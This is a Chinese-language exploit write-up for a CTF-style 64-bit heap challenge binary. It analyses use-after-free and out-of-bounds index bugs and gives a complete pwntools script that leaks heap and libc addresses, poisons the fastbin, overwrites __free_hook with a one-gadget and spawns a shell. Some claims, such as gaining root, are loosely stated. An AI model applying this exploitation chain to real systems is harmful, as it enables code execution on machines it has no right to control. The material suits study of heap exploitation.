# 漏洞利用文档

## 执行环境
基于程序分析和调试记录，总结执行环境如下：
- **二进制文件**：64位ELF可执行文件，动态链接
- **保护机制**（推断自漏洞利用过程）：
  - **NX**：启用（数据段不可执行，需使用ROP或one-gadget）
  - **PIE**：禁用（全局地址固定，如ptr数组0x602080）
  - **RELRO**：Full（GOT表只读，需通过堆漏洞绕过）
  - **Stack Canary**：存在但未在利用中触发
- **堆管理**：使用ptmalloc（glibc堆分配器）
- **依赖库**：标准libc（如libc.so.6），版本通过main_arena偏移0x3c4000推断为较新版本
- **运行平台**：Linux x86_64

## 漏洞成因
### 关键结构体分析
程序使用以下全局数据结构：
- **ptr数组**（地址0x602080）：10个8字节指针，存储分配的堆块地址
- **dword_6020B0**（地址0x6020B0）：编辑操作计数器，位于ptr[2]位置

### 漏洞类型及成因
1. **Use-after-Free (UAF)**
   - **位置**：`sub_400B54`（free函数）和`sub_400A79`（edit函数）
   - **成因**：释放堆块后未将ptr数组中的指针置空，导致悬空指针可被edit/show函数继续使用
   - **影响**：允许读写已释放内存，破坏堆元数据或泄露地址

2. **越界写入**
   - **位置**：`sub_400A79`（edit函数）的索引检查
   - **成因**：索引范围检查不严（允许0-31），但ptr数组只有10个元素（索引0-9）
   - **影响**：索引10-31可写入全局内存区域，覆盖关键变量或函数指针

3. **全局变量覆盖**  
   - **位置**：`sub_4009A0`（alloc函数）分配索引2时
   - **成因**：dword_6020B0位于ptr[2]位置，分配索引2会覆盖该变量为堆指针
   - **影响**：编辑计数器功能失效，可能造成指针算术错误

## 漏洞利用过程
### 堆内存变化时序分析
| 步骤 | 操作 | 堆关键变化 | 全局内存变化 | 利用阶段 |
|------|------|------------|-------------|----------|
| 1 | malloc(0,1); free(1,0) | 创建fastbin链：0x3ad39000→0x3ad39030 | ptr[0,1]成为悬空指针 | UAF准备 |
| 2 | puts(0) | 读取chunk 0的fd指针 | 泄露heap_addr = 0x3ad39000 | 堆地址泄露 |
| 3 | edit(0,py1) | 伪造fastbin链：fd指向0x3ad39020 | dword_6020B0 = 1（编辑计数） | 堆布局操纵 |
| 4 | malloc(6,7,2,3) | 分配多个chunk，设置fake size 0xa1 | ptr[2]覆盖dword_6020B0 | 堆风水布局 |
| 5 | malloc(4,py2) | 构造fake chunk指向0x602068 | ptr[4] = 0x3ad390d0 | 任意地址写入准备 |
| 6 | malloc(5,py3) | 设置prev_size为0x30 | ptr[5] = 0x3ad39100 | 触发unsorted bin |
| 7 | free(1) | chunk 1进入unsorted bin | ptr[1]保持悬空指针 | libc泄露准备 |
| 8 | puts(1) | 读取unsorted bin的bk指针 | 泄露main_arena = 0x78a890f44b20 | libc地址泄露 |
| 9 | edit(4,p64(free_hook)) | 修改fake chunk指向__free_hook | ptr[4]指向libc的free_hook | hook劫持准备 |
| 10 | edit(1,p64(onegadget)) | 覆盖__free_hook为one-gadget | __free_hook = 0x78a890bc527a | 控制流劫持 |
| 11 | free(2) | 触发__free_hook执行 | 启动/bin/dash shell | 代码执行 |
| 12 | interactive() | 进程完全切换 | 获得root shell权限 | 利用完成 |

### 关键内存状态演变
- **初始状态**：堆为空，ptr数组全0，dword_6020B0=0
- **中期状态**：fastbin链被污染，unsorted bin包含main_arena指针
- **最终状态**：__free_hook被覆盖，进程执行shell代码

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample2')
p = process('./data/sample2')
libc = elf.libc

# 工具函数定义
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(index, Content):
    ru("Choice:")
    sl('1')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

def free(Index):
    ru("Choice:")
    sl('4')
    ru("Index:")
    sl(str(Index))

def puts(Index):
    ru("Choice:")
    sl('3')
    ru("Index:")
    sl(str(Index))

def edit(index, Content):
    ru("Choice:")
    sl('2')
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

# 步骤1：创建UAF条件
malloc(0, b'aaaaaaaa\n')
malloc(1, b'bbbbbbbb\n')
free(1)
free(0)  # 形成fastbin链，ptr[0,1]成为悬空指针

# 步骤2：泄露堆地址
puts(0)  # 通过UAF读取已释放chunk的fd指针
heap_addr = u64(rc(4).ljust(8, b'\x00')) - 0x30  # 计算堆基址

# 步骤3：伪造fastbin链
py1 = p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31)  # 构造fake chunk头
edit(0, py1)  # 通过UAF修改已释放内存，污染fastbin链

# 步骤4：堆布局构造
malloc(6, b'aaa\n')  # 分配新chunk
malloc(7, p64(0) + p64(0xa1) + b'\n')  # 设置fake size为0xa1
malloc(2, b'cccccccc\n')  # 分配索引2，覆盖dword_6020B0
malloc(3, b'dddddddd\n')  # 分配索引3

# 步骤5：构造unsorted bin攻击
FD = 0x602080 - 24  # 指向全局变量区域的fake fd
BK = 0x602080 - 16  # 指向全局变量区域的fake bk
py2 = p64(0) + p64(0x31) + p64(FD) + p64(BK)  # 伪造chunk元数据
malloc(4, py2)  # 分配fake chunk指向全局区域

# 步骤6：触发unsorted bin合并
py3 = p64(0x30) + p64(0x30) + b'\n'
malloc(5, py3)  # 分配特定大小chunk
free(1)  # 释放chunk进入unsorted bin，准备泄露libc

# 步骤7：泄露libc地址
puts(1)  # 通过UAF读取unsorted bin的bk指针
main_arena = u64(rc(6).ljust(8, b'\x00')) - 88  # 计算main_arena地址
libc_base = (main_arena & 0xfffffffff000) - 0x3c4000  # 计算libc基址

# 步骤8：计算one-gadget和free_hook地址
onegadget = libc_base + 0x4527a  # one-gadget偏移（需适配目标libc）
free_hook = libc_base + libc.symbols["__free_hook"]  # __free_hook地址

# 步骤9：覆盖__free_hook
edit(4, p64(free_hook) + b'\n')  # 修改fake chunk指向__free_hook

# 步骤10：写入one-gadget
edit(1, p64(onegadget) + b'\n')  # 覆盖__free_hook为one-gadget

# 步骤11：触发执行
free(2)  # 调用free触发__free_hook，执行one-gadget获取shell

# 步骤12：交互
p.interactive()  # 进入shell交互模式
```

### 关键注释说明
- **堆地址泄露**：利用UAF读取fastbin的fd指针，计算堆基址
- **fastbin污染**：通过编辑已释放chunk，构造指向任意地址的fake chunk
- **libc泄露**：利用unsorted bin的bk指针泄露main_arena，计算libc基址
- **hook劫持**：通过任意地址写入覆盖__free_hook，劫持free函数控制流
- **one-gadget**：使用libc中的one-gadget直接获取shell，绕过NX保护

该漏洞利用成功结合了UAF、堆溢出和全局变量覆盖漏洞，实现了从内存泄露到代码执行的完整攻击链。
